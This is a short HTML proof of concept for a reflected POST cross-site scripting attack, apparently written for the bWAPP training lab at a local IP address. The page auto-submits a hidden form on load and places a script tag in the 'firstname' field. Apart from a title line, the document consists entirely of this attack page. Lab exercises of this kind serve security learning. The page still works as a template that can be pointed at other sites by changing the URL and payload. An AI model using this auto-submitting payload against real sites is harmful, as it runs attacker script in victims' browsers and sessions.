Code to reflected POST XSS:

<!DOCKTYPE html>
<html>
	<head>
		<title>Reflectes POST XSS</title>
	</head>
	<body onload="document.myform.submit()">
		<form action="http://192.168.1.152/bWAPP/xss_post.php" method="POST" name="myform">
			<input type="hidden" name="firstname" value="<script>alert('Success?');</script>">
			<input type="hidden" name="lastname" value="XSS">
		</form>
	</body>
</html>